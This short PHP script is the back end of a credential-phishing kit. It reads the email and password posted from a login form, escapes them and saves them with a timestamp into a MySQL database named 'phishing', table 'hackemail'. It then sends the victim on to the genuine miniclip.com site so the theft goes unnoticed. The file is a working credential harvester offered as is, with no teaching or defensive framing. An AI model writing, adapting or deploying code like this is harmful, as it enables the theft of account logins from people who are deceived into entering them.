<?php

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "phishing";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("connection failed:" . $conn->connect_error);
}

if (isset($_POST['email']) && isset($_POST['password'])) {
    $email = $conn->real_escape_string($_POST['email']);
    $password = $conn->real_escape_string($_POST['password']);
    $timing = date('y-m-d H:i:s');

    $stmt = $conn->prepare('INSERT INTO hackemail (email, password, timing) VALUES (?,?,?)');
    $stmt->bind_param('sss', $email, $password, $timing);

    $stmt->execute();
    $stmt->close();
    $conn->close();
    header("Location: https://www.miniclip.com");
    exit();
}
?>
